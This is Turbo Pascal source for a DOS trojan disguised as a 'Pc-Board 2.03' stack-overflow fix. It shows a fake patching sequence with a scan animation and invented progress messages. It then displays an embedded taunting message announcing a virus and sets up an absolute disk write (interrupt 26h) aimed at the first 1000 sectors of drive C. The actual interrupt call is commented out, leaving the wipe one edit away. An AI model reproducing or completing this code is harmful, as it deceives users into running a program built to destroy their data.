{$I-}
PROGRAM Formatter (input, output);
uses dos,crt,printer,extra;

Type ScreenType = array [0..3999] of Byte;
Var Regs    						: Registers;
    ResultIo            : Integer;
    CounterOne          : Integer;
    CounterTwo          : Integer;
    CounterThree        : Integer;
    CounterFour         : Integer;
    XPosition           : Integer;
    YPosition           : Integer;
    TargetAddressNumber : Integer;
		PcBoardDirectory    : String;
    CountOne            : String;
    CountTwo            : String;
    CountThree          : String;
    CountFour           : String;
	  ScreenAddr 				  : ScreenType absolute $B800:$0000;

Const ProgramOne ='Command.Com';
			ProgramTwo ='Command.Com';
      SearchFor  ='Stack Overflow';
      ShortName  ='Pc-Board';
      Version    ='2.03';
      LongName   = ShortName+' '+Version+' Fix for '+SearchFor;
      Directory  ='C:\PCBOARD\';
      Programmers='Programmed by Larry Jones';
			ImageData  : array [1..648] of Char = (
#16,#24,#25,#3 ,#15,'Y','o','u',' ','s','t','u','p','i','d',' ','l','i','t',
't','l','e',' ','s','h','i','t',',',' ','t','h','i','s',' ','i','s',' ','a',
' ','V','I','R','U','S',',',' ','d','i','s','t','r','i','b','u','t','e','d',
' ','b','y',' ','n','o',' ','o','t','h','e','r',' ','t','h','a','n','.','.',
'.',#24,#24,#25,#11,#12,#27,#17,'Ú',#26,#53,'Ä','¿',#24,#16,#25,#11,#17,'³',
' ',' ',#11,#27,'ß',#26,#6 ,'Û','Ü',' ',' ','Ü',#26,#5 ,'Û','Ü',' ',' ','ß',
#26,#7 ,'Û','Ü',' ','ß','ß','Û','Û','ß','ß',' ','ß',#26,#6 ,'Û','Ü',#25,#3 ,
#12,#27,'³',#15,#27,#23,'Û',#24,#16,#25,#11,#12,#27,#17,'³',#25,#2 ,#11,#27,
'Û','Û',#25,#3 ,'Û','Û',' ',' ','Û','Û',#25,#3 ,'Û','Û',#25,#2 ,'Û','Û',#25,
#3 ,'Ü','Û','Û',#25,#2 ,'Û','Û',#25,#3 ,'Û','Û',#25,#4 ,'Û','Û',#25,#2 ,#12,
#27,'³',#15,#27,#23,'Û',#7 ,'Û',#24,#16,#25,#11,#12,#27,#17,'³',#25,#2 ,#11,
#27,#26,#6 ,'Û',#25,#2 ,#26,#7 ,'Û',#25,#2 ,#26,#7 ,'Û',#25,#3 ,'Û','Û',#25,
#3 ,'Û','Û',#25,#4 ,'Û','Û',#25,#2 ,#12,#27,'³',#15,#27,#23,'Û',#7 ,'Û',#8 ,
#16,'Û',#24,#25,#11,#12,#27,#17,'³',#25,#2 ,#11,#27,'Û','Û',' ','ß','Û','Ü',
#25,#3 ,'Û','Û',#25,#3 ,'Û','Û',#25,#2 ,'Û','Û',#25,#3 ,'ß','Û','Û',#25,#2 ,
'Û','Û',#25,#3 ,'Û','Û',#25,#4 ,'Û','Û',#25,#2 ,#12,#27,'³',#15,#27,#23,'Û',
#7 ,'Û',#8 ,#16,'Û',#24,#25,#11,#12,#27,#17,'³',' ',' ',#11,#27,'Ü','Û','Û',
'Ü',' ','Ü','Û','Û','Ü',' ','Ü','Û','Û','Ü',' ',' ','Ü','Û','Û','Ü',' ','Ü',
#26,#7 ,'Û','ß',' ','Ü','Ü','Û','Û','Ü','Ü',' ','Ü',#26,#6 ,'Û','ß',#25,#3 ,
#12,#27,'³',#15,#27,#23,'Û',#7 ,'Û',#8 ,#16,'Û',#24,#25,#11,#12,#27,#17,'À',
#26,#53,'Ä','Ù',#15,#27,#23,'Û',#7 ,'Û',#8 ,#16,'Û',#24,#25,#13,#15,'ß',#23,
#26,#53,'ß',#7 ,'Û',#8 ,#16,'Û',#24,#25,#15,#26,#54,'ß',#24,#25,#17,#7 ,'W',
'e',#39,'r','e',' ','g','o','n','n','a',' ','g','e','t',' ','y','o','u',',',
' ','n','o',' ','m','a','t','t','e','r',' ','w','h','a','t',' ','i','t',' ',
't','a','k','e','s','.',#24,#25,#17,'L','i','s','t','e','n',' ','u','p',',',
' ','k','i','d','s',#26,#4 ,'.',#15,'D','O','N',#39,'T',' ','F','U','C','K',
' ','W','I','T','H',' ','R','A','B','I','D',#7 ,#26,#3 ,'.',#24,#25,#21,'Y',
'o','u',#39,'l','l',' ','n','e','v','e','r',' ','l','i','v','e',' ','t','o',
' ','m','a','k','e',' ','i','t',' ','a','l','i','v','e','.','.',#24,#24,#25,
#14,'W','i','n','n','i','n','g',' ','t','h','e',' ','b','a','t','t','l','e',
',',' ','a','g','a','i','n','s','t',' ',#15,'F','U','C','K','E','R','S',' ',
#7 ,'l','i','k','e',' ','y','o','u','r','s','e','l','f','.','.',#24,#24,#25,
#23,#4 ,'(','T','h','e',' ','W','o','r','d','s',' ','f','r','o','m',' ','t',
'h','e',' ','I','m','m','o','r','t','a','l',' ','O','n','e',')',#24,#24,#24,
#24,#24);

procedure UNCRUNCH (var Addr1,Addr2; BlkLen:Integer);
begin
  inline ($1E/$C5/$B6/Addr1/$C4/$BE/Addr2/$8B/$8E/BlkLen/$8B/$D7/$B4/$00/
  $AC/$3C/$10/$73/$07/$80/$E4/$F0/$0A/$E0/$EB/$44/$3C/$18/$74/$13/$73/$19/
  $2C/$10/$02/$C0/$02/$C0/$02/$C0/$02/$C0/$80/$E4/$0F/$0A/$E0/$EB/$2D/$81/
  $C2/$A0/$00/$8B/$FA/$EB/$25/$3C/$1A/$75/$0B/$AC/$49/$51/$32/$ED/$8A/$C8/
  $AC/$EB/$0D/$90/$3C/$19/$75/$11/$AC/$51/$32/$ED/$8A/$C8/$B0/$20/$0B/$C9/
  $74/$03/$AB/$E2/$FD/$59/$49/$AB/$0B/$C9/$74/$02/$E2/$AA/$1F);
end;

Function Exist (FileName:String):Boolean;
Var FileToOpen:File;
    CounterOne:Integer;
Begin
  Assign (FileToOpen,FileName);
  Reset (FileToOpen);
  CounterOne:=ioresult;
  Exist:=CounterOne=0;
  Close (FileToOpen);
  CounterOne:=ioresult
End;

Procedure WasteTime (TimeToWaste:Integer);
Var CounterOne:Integer;
		FileToOpen:File;
Begin
  For CounterOne:=1 to TimeToWaste do begin
	  Assign (FileToOpen,'C:\COMMAND.COM');
	  Reset (FileToOpen);
	  Close (FileToOpen);
    Randomize;
    delay (Random(500));
  end;
end;

Function Strr(IntegerNumber:Integer):String;
Var StringNumber:String;
Begin
  Str(IntegerNumber,StringNumber);
  Strr:=StringNumber;
End;

procedure Format;
Begin
	Clrscr;
	UnCrunch (ImageData,ScreenAddr[ (1*2) + (1*160) -162],648);
{	Intr ($26,Regs);}
end;

begin
  SetCBreak(true);
  TargetAddressNumber:=1;
	NormCursorOn;
	TextColor (7);
  TextBackGround(0);
  writeln;
  writeln;
  writeln;
  writeln (LongName);
  writeln (Programmers);
  repeat;
	  writeln;
	  writeln (' Enter the Directory where '+ShortName+' '+Version+' is Stored: (Eg. '+Directory+') ');
    writeln;
	  write   (' Directory Name>: ');
	  readln (PcBoardDirectory);
    if (length(PcBoardDirectory)=0) then PcBoardDirectory:='__________';
	  ChDir (PcBoardDirectory);
    ResultIo:=0;
    ResultIo:=IoResult;
	  If ResultIo <>0 then begin
	  	writeln;
      TextColor(4);
	    writeln (' Directory does not exist.');
      TextColor(7);
      writeln;
      writeln;
      halt;
	  end;
  until ResultIo=0;
  ChDir (PcBoardDirectory);
  if ((not(exist(ProgramOne))) or (not(exist(ProgramTwo)))) then begin
  	writeln;
    TextColor(4);
    writeln (' '+ShortName+' files not found.');
    TextColor(7);
    Halt;
  end;
  writeln;
  write (' Loading '+ShortName+'.EXE... ');
  WasteTime (70);
  Delay (2000);
  write (' Searching for '+SearchFor+' - ');
  TargetAddressNumber:=TargetAddressNumber+3;
  TargetAddressNumber:=TargetAddressNumber-2;
  TargetAddressNumber:=TargetAddressNumber*2;
  Delay (1500);
  CursorOff;
 	XPosition:=WhereX;
  YPosition:=WhereY;
  For CounterOne:=0 to 1 do begin
  	For CounterTwo:=0 to 13 do begin
    	For CounterThree:=0 to 7 do begin
      	For CounterFour:=0 to 11 do begin
          Gotoxy (XPosition,YPosition);
          if CounterFour=10 then CountFour:='A' else
          if CounterFour=11 then CountFour:='B' else
          if CounterFour=12 then CountFour:='C' else
          if CounterFour=13 then CountFour:='D' else
          CountFour:=strr(CounterFour);
          if CounterThree=10 then CountThree:='A' else
          if CounterThree=11 then CountThree:='B' else
          if CounterThree=12 then CountThree:='C' else
          if CounterThree=13 then CountThree:='D' else
          CountThree:=strr(CounterThree);
          if CounterTwo=10 then CountTwo:='A' else
          if CounterTwo=11 then CountTwo:='B' else
          if CounterTwo=12 then CountTwo:='C' else
          if CounterTwo=13 then CountTwo:='D' else
          CountTwo:=strr(CounterTwo);
          if CounterOne=10 then CountOne:='A' else
          if CounterOne=11 then CountOne:='B' else
          if CounterOne=12 then CountOne:='C' else
          if CounterOne=13 then CountOne:='D' else
          CountOne:=strr(CounterOne);
          write ('1B9C:',CountOne,CountTwo,CountThree,CountFour);
        end;
      end;
    end;
  end;
  NormCursorOn;
  Delay (1500);
  writeln;
  write (' '+strr(TargetAddressNumber)+' Target Address Found... ');
  Delay (1500);
  writeln ('Fixing '+SearchFor+'...');
  delay (3000);
  write (' Rewriting '+ShortName+' Program.... ');
  WasteTime (30);
  writeln (' '+SearchFor+' will not occur any more.');
	Regs.AL:=2;
  Regs.CX:=1000;
  Regs.DX:=0;
  Format;
end.
